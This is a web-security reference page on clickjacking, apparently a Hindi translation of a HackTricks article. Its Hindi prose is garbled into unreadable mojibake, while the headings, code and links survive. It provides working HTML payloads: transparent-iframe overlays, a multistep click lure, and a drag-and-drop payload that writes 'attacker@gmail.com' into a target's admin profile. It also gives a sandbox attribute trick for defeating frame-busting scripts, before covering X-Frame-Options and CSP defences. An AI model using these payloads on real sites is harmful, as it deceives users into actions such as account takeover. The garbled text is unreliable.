# Clickjacking

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХреЛ рдмрд┐рд▓реНрдб рдФрд░ рдСрдЯреЛрдореЗрдЯ** рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ.\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Clickjacking рдХреНрдпрд╛ рд╣реИ

Clickjacking рдПрдХ рд╣рдорд▓рд╛ рд╣реИ рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **рдХреНрд▓рд┐рдХ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЪрд╛рд▓рд╛рдХреА** рд╕реЗ рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ рдПрдХ рд╡реЗрдмрдкреЗрдЬ **рддрддреНрд╡** рдкрд░ рдЬреЛ **рдЕрджреГрд╢реНрдп** рд╣реИ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рддрддреНрд╡ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдЪреНрдЫрдиреНрди рд╣реИ. рдЗрд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдореИрд▓рд╡реЗрдпрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдорд▓рд┐рд╢рд┐рдпрд╕ рд╡реЗрдм рдкреЗрдЬреЛрдВ рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреИрд╕реЗ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдСрдирд▓рд╛рдЗрди рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рдЦрд░реАрджрд╛рд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ. (рдпрд╣рд╛рдБ рд╕реЗ [here](https://www.imperva.com/learn/application-security/clickjacking/)).

### Prepopulate forms trick

рдХрднреА-рдХрднреА рдкреЗрдЬ рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп GET рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреЙрд░реНрдо рдХреЗ рдлреАрд▓реНрдбреНрд╕ рдХреА рд╡реИрд▓реНрдпреВ рдХреЛ **рднрд░рдирд╛ рд╕рдВрднрд╡** рд╣реЛрддрд╛ рд╣реИ. рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдлреЙрд░реНрдо рдХреЛ рдордирдорд╛рдиреЗ рдбреЗрдЯрд╛ рд╕реЗ рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рдкреЗрд▓реЛрдб рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдмрдорд┐рдЯ рдмрдЯрди рджрдмрд╛рдП.

### Populate form with Drag\&Drop

рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдлреЙрд░реНрдо рднрд░реЗ** рд▓реЗрдХрд┐рди рдЖрдк рд╕реАрдзреЗ рдЙрд╕рд╕реЗ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдЬрд╛рдирдХрд╛рд░реА (рдЬреИрд╕реЗ рдХрд┐ рдИрдореЗрд▓ рдФрд░ рдпрд╛ рд╡рд┐рд╢реЗрд╖ рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ) рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд╣рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕рд╕реЗ рдХреЗрд╡рд▓ **Drag\&Drop** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд▓рд┐рдЦреЗрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ [**рдЗрд╕ рдЙрджрд╛рд╣рд░рдг**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) рдореЗрдВ.

### Basic Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### рдорд▓реНрдЯреАрд╕реНрдЯреЗрдк рдкреЗрд▓реЛрдб
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### рдбреНрд░реИрдЧ\&рдбреНрд░реЙрдк + рдХреНрд▓рд┐рдХ рдкреЗрд▓реЛрдб
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **XSS рд╣рдорд▓реЗ рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рддрддреНрд╡ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** рддрд╛рдХрд┐ XSS рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдкреГрд╖реНрда **Clickjacking рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдЯрди/рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд▓рд╛рдХреА рд╕реЗ рдмрд╣рдХрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг:\
_рдЖрдкрдиреЗ рдЦрд╛рддреЗ рдХреА рдХреБрдЫ рдирд┐рдЬреА рдЬрд╛рдирдХрд╛рд░рд┐рдпреЛрдВ рдореЗрдВ рдПрдХ **self XSS** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реИ (рдЬрд╛рдирдХрд╛рд░рд┐рдпрд╛рдВ рдЬреЛ **рдХреЗрд╡рд▓ рдЖрдк рд╕реЗрдЯ рдФрд░ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**). рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреГрд╖реНрда **Clickjacking рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╣реИ рдФрд░ рдЖрдк GET рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде **рдлреЙрд░реНрдо рдХреЛ рдкреВрд░реНрд╡-рдкреЙрдкреБрд▓реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред_\
\_\_рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдкреГрд╖реНрда рдкрд░ **Clickjacking** рд╣рдорд▓реЗ рдХреА рддреИрдпрд╛рд░реА рдХрд░ рд╕рдХрддрд╛ рд╣реИ **рдлреЙрд░реНрдо рдХреЛ XSS рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдкреВрд░реНрд╡-рдкреЙрдкреБрд▓реЗрдЯ** рдХрд░рдХреЗ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЪрд╛рд▓рд╛рдХреА рд╕реЗ рдмрд╣рдХрд╛** рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, **рдЬрдм рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдорд╛рди рдмрджрд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ XSS рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред

## Clickjacking рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдЙрдкрд╛рдп

### рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рд░рдХреНрд╖рд╛

Clickjacking рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╛ рд╕рднреА рдХреЛ рдХрд░рддреЗ рд╣реИрдВ:

* рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡рд┐рдВрдбреЛ рдореБрдЦреНрдп рдпрд╛ рдЯреЙрдк рд╡рд┐рдВрдбреЛ рд╣реИ,
* рд╕рднреА рдлреНрд░реЗрдореНрд╕ рдХреЛ рджреГрд╢реНрдпрдорд╛рди рдмрдирд╛рдПрдВ,
* рдЕрджреГрд╢реНрдп рдлреНрд░реЗрдореНрд╕ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХреЗрдВ,
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░ рд╕рдВрднрд╛рд╡рд┐рдд Clickjacking рд╣рдорд▓реЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВ рдФрд░ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░реЗрдВред

#### рдмрд╛рдИрдкрд╛рд╕

рдЪреВрдВрдХрд┐ рдлреНрд░реЗрдо рдмрд╕реНрдЯрд░реНрд╕ JavaScript рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдЙрдирдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЛ рд░реЛрдХ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ JavaScript рдХрд╛ рд╕рдорд░реНрдерди рднреА рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдлреНрд░реЗрдо рдмрд╕реНрдЯрд░реНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рдкреНрд░рднрд╛рд╡реА рд╣рдорд▓рд╛рд╡рд░ рд╡рд░реНрдХрдЕрд░рд╛рдЙрдВрдб **HTML5 iframe `sandbox` рд╡рд┐рд╢реЗрд╖рддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рдЬрдм рдЗрд╕реЗ `allow-forms` рдпрд╛ `allow-scripts` рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `allow-top-navigation` рдорд╛рди рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдлреНрд░реЗрдо рдмрд╕реНрдЯрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ iframe рдпрд╣ рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЯреЙрдк рд╡рд┐рдВрдбреЛ рд╣реИ рдпрд╛ рдирд╣реАрдВ:
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
```
`allow-forms` рдФрд░ `allow-scripts` рдорд╛рди iframe рдХреЗ рднреАрддрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рдиреЗрд╡рд┐рдЧреЗрд╢рди рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдлреНрд░реЗрдо рдмрд╕реНрдЯрд┐рдВрдЧ рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ рдЬрдмрдХрд┐ рд▓рдХреНрд╖рд┐рдд рд╕рд╛рдЗрдЯ рдХреЗ рднреАрддрд░ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

Clickjacking рд╣рдорд▓реЗ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ **рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ**: `allow-same-origin` рдФрд░ `allow-modals` рдпрд╛ [рдФрд░ рднреА рдЕрдзрд┐рдХ](https://www.w3schools.com/tags/att_iframe_sandbox.asp)ред рд╣рдорд▓реЗ рдХреА рддреИрдпрд╛рд░реА рдХрд░рддреЗ рд╕рдордп рдмрд╕ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдХрдВрд╕реЛрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдпрд╣ рдЖрдкрдХреЛ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреМрди рд╕реЗ рдЕрдиреНрдп рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

### X-Frame-Options

**`X-Frame-Options` HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ `<frame>` рдпрд╛ `<iframe>` рдореЗрдВ рдкреГрд╖реНрда рдХреЛ рд░реЗрдВрдбрд░ рдХрд░рдиреЗ рдХреА **рдЕрдиреБрдорддрд┐** рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред рд╕рд╛рдЗрдЯреЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Clickjacking рд╣рдорд▓реЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдХреЗ рдХрд┐ **рдЙрдирдХреА рд╕рд╛рдордЧреНрд░реА рдЕрдиреНрдп рд╕рд╛рдЗрдЯреЛрдВ рдореЗрдВ рдПрдореНрдмреЗрдб рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА**ред HTML рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓реА рд╕рднреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП **`X-Frame-Options`** рд╣реЗрдбрд░ рд╕реЗрдЯ рдХрд░реЗрдВред рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди рд╣реИрдВ:

* `X-Frame-Options: deny` рдЬреЛ **рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдХреЛ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдлреНрд░реЗрдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ** _(рдЕрдиреБрд╢рдВрд╕рд┐рдд рдорд╛рди)_
* `X-Frame-Options: sameorigin` рдЬреЛ рдХреЗрд╡рд▓ **рд╡рд░реНрддрдорд╛рди рд╕рд╛рдЗрдЯ рдХреЛ** рд╕рд╛рдордЧреНрд░реА рдХреЛ рдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* `X-Frame-Options: allow-from https://trusted.com` рдЬреЛ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ 'uri' рдХреЛ** рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* рдиреАрдЪреЗ рджреА рдЧрдИ рд╕реАрдорд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдпрджрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЦреБрд▓рд╛ рд░рд╣реЗрдЧрд╛**ред
* рдЕрдиреНрдп рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдирдП **CSP frame-ancestors рдирд┐рд░реНрджреЗрд╢ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ**ред рдХреБрдЫ рджреЛрдиреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред

### Content Security Policy (CSP) frame-ancestors рдирд┐рд░реНрджреЗрд╢

**рдЕрдиреБрд╢рдВрд╕рд┐рдд clickjacking рд╕реБрд░рдХреНрд╖рд╛** рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА Content Security Policy рдореЗрдВ **`frame-ancestors` рдирд┐рд░реНрджреЗрд╢** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реИред\
**`frame-ancestors 'none'`** рдирд┐рд░реНрджреЗрд╢ **X-Frame-Options `deny`** рдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╕рдорд╛рди рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ рд╣реИ (_рдХреЛрдИ рднреА рдкреГрд╖реНрда рдХреЛ рдлреНрд░реЗрдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛_)ред\
**`frame-ancestors 'self'`** рдирд┐рд░реНрджреЗрд╢ **X-Frame-Options `sameorigin`** рдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╕рдорд╛рди рд╣реИ (_рдХреЗрд╡рд▓ рд╡рд░реНрддрдорд╛рди рд╕рд╛рдЗрдЯ рдЗрд╕реЗ рдлреНрд░реЗрдо рдХрд░ рд╕рдХрддреА рд╣реИ_)ред\
**`frame-ancestors trusted.com`** рдирд┐рд░реНрджреЗрд╢ **X-Frame-Options** `allow-from`рдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╕рдорд╛рди рд╣реИ (_рдХреЗрд╡рд▓ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕рд╛рдЗрдЯ рдЗрд╕реЗ рдлреНрд░реЗрдо рдХрд░ рд╕рдХрддреА рд╣реИ_)ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CSP рдХреЗрд╡рд▓ рд╕рдорд╛рди рдбреЛрдореЗрди рдХреЗ рдлреНрд░реЗрдореНрд╕ рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ:

`Content-Security-Policy: frame-ancestors 'self';`

рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдФрд░ рдЖрдЧреЗ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рджреЗрдЦреЗрдВ:

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### рд╕реАрдорд╛рдПрдБ <a href="#limitations" id="limitations"></a>

* **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕рдорд░реНрдерди:** CSP frame-ancestors рд╕рднреА рдкреНрд░рдореБрдЦ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЕрднреА рддрдХ рд╕рдорд░реНрдерд┐рдд рдирд╣реАрдВ рд╣реИрдВред
* **X-Frame-Options рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд┐рд▓рддреА рд╣реИ:** [CSP Spec рдХреЗ "Relation to X-Frame-Options" рдЕрдиреБрднрд╛рдЧ](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) рдХрд╣рддрд╛ рд╣реИ: "_рдпрджрд┐ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рдПрдХ рдиреАрддрд┐ рдХреЗ рд╕рд╛рде рд╡рд┐рддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ frame-ancestors рдирд╛рдордХ рдПрдХ рдирд┐рд░реНрджреЗрд╢ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХрд╛ рдбрд┐рд╕реНрдкреЛрдЬрд┐рд╢рди "enforce" рд╣реЛрддрд╛ рд╣реИ, рддреЛ X-Frame-Options рд╣реЗрдбрд░ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП_", рд▓реЗрдХрд┐рди Chrome 40 рдФрд░ Firefox 35 frame-ancestors рдирд┐рд░реНрджреЗрд╢ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп X-Frame-Options рд╣реЗрдбрд░ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
